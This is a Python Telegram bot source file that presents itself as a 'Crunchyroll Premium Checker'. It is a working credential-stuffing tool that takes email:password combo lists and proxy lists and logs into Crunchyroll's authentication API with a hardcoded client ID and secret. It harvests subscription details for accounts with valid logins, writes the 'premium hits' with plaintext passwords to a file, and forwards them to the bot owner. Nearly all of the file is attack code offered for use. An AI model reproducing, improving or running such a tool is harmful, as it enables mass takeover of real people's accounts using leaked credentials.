#!/usr/bin/env python3
import os
import uuid
import random
import threading
import time
import asyncio
from queue import Queue, Empty

import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# ================== CONFIG ==================
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", 0))

# ============================================

class CrunchyrollChecker:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.countries = { ... }   # ← Your full countries dict is already here (same as original)

    def _get_random_proxy(self):
        if not self.proxies:
            return None
        proxy = random.choice(self.proxies)
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}

    def check(self, email, password):
        # === YOUR ORIGINAL CHECK LOGIC (unchanged) ===
        device_id = str(uuid.uuid4())
        session = requests.Session()
        
        proxy = self._get_random_proxy()
        if proxy:
            session.proxies.update(proxy)
        
        url = "https://beta-api.crunchyroll.com/auth/v1/token"
        
        headers = {
            'host': 'beta-api.crunchyroll.com',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
        }
        
        data = {
            'grant_type': 'password',
            'username': email,
            'password': password,
            'scope': 'offline_access',
            'client_id': 'y2arvjb0h0rgvtizlovy',
            'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
            'device_type': 'Baron',
            'device_id': device_id,
            'device_name': 'Baron'
        }
        
        try:
            response = session.post(url, headers=headers, data=data, timeout=15)
            response_text = response.text
            
            if any(x in response_text for x in ["invalid_credentials", "force_password_reset", "too_many_requests", "401", "400", "missing_required_field"]):
                return {'status': 'INVALID', 'email': email}
            
            if '"access_token"' not in response_text:
                return {'status': 'INVALID', 'email': email}
            
            data = response.json()
            access_token = data.get('access_token')
            
            if not access_token:
                return {'status': 'INVALID', 'email': email}
            
            headers = {
                'authorization': f'Bearer {access_token}',
                'connection': 'Keep-Alive',
                'host': 'beta-api.crunchyroll.com',
                'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
            }
            
            response = session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=15)
            account_data = response.json()
            
            email_verified = account_data.get('email_verified', False)
            created = account_data.get('created', '').split('T')[0]
            external_id = account_data.get('external_id')
            
            response = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products', headers=headers, timeout=15)
            products_data = response.json()
            
            plan = "Free"
            currency = "N/A"
            subscribable = "False"
            free_trial = "False"
            
            if 'items' in products_data and len(products_data['items']) > 0:
                item = products_data['items'][0]
                plan = item.get('product', {}).get('sku', 'Unknown')
                currency = item.get('currency_code', 'N/A')
                subscribable = str(item.get('product', {}).get('is_subscribable', False))
                free_trial = str(item.get('active_free_trial', False))
            
            response = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}', headers=headers, timeout=15)
            sub_data = response.json()
            
            expiry = sub_data.get('next_renewal_date', 'N/A')
            if expiry and 'T' in expiry:
                expiry = expiry.split('T')[0]
            
            plan_duration = sub_data.get('cycle_duration', 'N/A')
            is_active = str(sub_data.get('is_active', False))
            country_code = sub_data.get('country_code', 'US')
            country = self.countries.get(country_code, f"{country_code} 🌍")
            is_cancelled = sub_data.get('is_cancelled', False)
            
            if is_cancelled or subscribable == "False" or "Subscription Not Found" in response.text:
                status = "FREE"
            elif subscribable == "True":
                status = "PREMIUM"
            else:
                status = "FREE"
            
            return {
                'status': status,
                'email': email,
                'password': password,
                'email_verified': email_verified,
                'account_creation_date': created,
                'plan': plan,
                'currency': currency,
                'subscribable': subscribable,
                'free_trial': free_trial,
                'expiry': expiry,
                'plan_duration': plan_duration,
                'active': is_active,
                'country': country
            }
            
        except Exception:
            return {'status': 'ERROR', 'email': email}


checker = None
active_proxies = []

def save_hit(result):
    capture = f"""
{'='*70}
EMAIL: {result['email']}
PASSWORD: {result['password']}
STATUS: {result['status']}
EMAIL VERIFIED: {result.get('email_verified', 'N/A')}
ACCOUNT CREATION: {result.get('account_creation_date', 'N/A')}
PLAN: {result.get('plan', 'N/A')}
CURRENCY: {result.get('currency', 'N/A')}
SUBSCRIBABLE: {result.get('subscribable', 'N/A')}
FREE TRIAL: {result.get('free_trial', 'N/A')}
EXPIRY: {result.get('expiry', 'N/A')}
PLAN DURATION: {result.get('plan_duration', 'N/A')}
ACTIVE: {result.get('active', 'N/A')}
COUNTRY: {result.get('country', 'N/A')}
CHECKED BY: @Sudhakaran12
{'='*70}
"""
    with open("hits.txt", "a", encoding="utf-8") as f:
        f.write(capture)
    return capture


# ===================== BOT =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🚀 <b>Crunchyroll Premium Checker</b>\n\n"
        "Bot made by @Sudhakaran12\n\n"
        "Use /check to load combos\n"
        "Use /proxies to load proxies\n"
        "Then /startcheck",
        parse_mode=ParseMode.HTML
    )


async def check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    await update.message.reply_text("📤 Send combo file or paste combos directly")
    context.user_data['waiting'] = 'combo'


async def proxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    await update.message.reply_text("📤 Send proxy file")
    context.user_data['waiting'] = 'proxy'


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    file = await update.message.document.get_file()
    filename = f"temp_{update.message.document.file_name}"
    await file.download_to_drive(filename)

    if context.user_data.get('waiting') == 'combo':
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if ':' in line]
        context.user_data['combos'] = combos
        global checker
        checker = CrunchyrollChecker(active_proxies)
        await update.message.reply_text(f"✅ Loaded {len(combos)} combos.\nType /startcheck")
        context.user_data['waiting'] = None

    elif context.user_data.get('waiting') == 'proxy':
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            global active_proxies
            active_proxies = [line.strip() for line in f if line.strip()]
        await update.message.reply_text(f"✅ Loaded {len(active_proxies)} proxies.")
        context.user_data['waiting'] = None


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    text = update.message.text.strip()
    if context.user_data.get('waiting') == 'combo' and ':' in text:
        combos = [line.strip() for line in text.splitlines() if ':' in line]
        context.user_data['combos'] = combos
        global checker
        checker = CrunchyrollChecker(active_proxies)
        await update.message.reply_text(f"✅ Loaded {len(combos)} combos.\nType /startcheck")


async def startcheck_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    combos = context.user_data.get('combos', [])
    if not combos:
        await update.message.reply_text("❌ No combos! Use /check first.")
        return

    await update.message.reply_text(f"🚀 Starting...\nCombos: {len(combos)}\nProxies: {len(active_proxies) or 'None'}")

    threading.Thread(target=run_checker, args=(combos, update.effective_chat.id, context.application.bot), daemon=True).start()


def run_checker(combos, chat_id, bot):
    q = Queue()
    for c in combos:
        q.put(c)

    stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0}

    def worker():
        while True:
            try:
                combo = q.get(timeout=5)
            except Empty:
                break
            try:
                email, password = combo.split(':', 1)
                password = password.split()[0].strip()
                result = checker.check(email.strip(), password.strip())

                stats['checked'] += 1

                if result['status'] == 'PREMIUM':
                    stats['premium'] += 1
                    capture = save_hit(result)
                    asyncio.run(bot.send_message(chat_id=chat_id, text=f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>", parse_mode=ParseMode.HTML))
                elif result['status'] == 'FREE':
                    stats['free'] += 1
                else:
                    stats['invalid'] += 1
            except:
                stats['invalid'] += 1
            finally:
                q.task_done()
                time.sleep(1.5)

    for _ in range(5):
        threading.Thread(target=worker, daemon=True).start()

    q.join()

    asyncio.run(bot.send_message(
        chat_id=chat_id,
        text=f"✅ <b>CHECK FINISHED!</b>\n\nChecked: {stats['checked']}\nPremium: {stats['premium']}\nFree: {stats['free']}\nInvalid: {stats['invalid']}",
        parse_mode=ParseMode.HTML
    ))


def main():
    if not BOT_TOKEN or OWNER_ID == 0:
        print("❌ Set BOT_TOKEN and OWNER_ID in Railway Variables")
        return

    global checker
    checker = CrunchyrollChecker()

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("check", check_cmd))
    app.add_handler(CommandHandler("proxies", proxies_cmd))
    app.add_handler(CommandHandler("startcheck", startcheck_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))   # ← THIS LINE IS NOW CLEAN

    print("🤖 Bot Started | Made by @Sudhakaran12")
    app.run_polling()


if __name__ == "__main__":
    main()
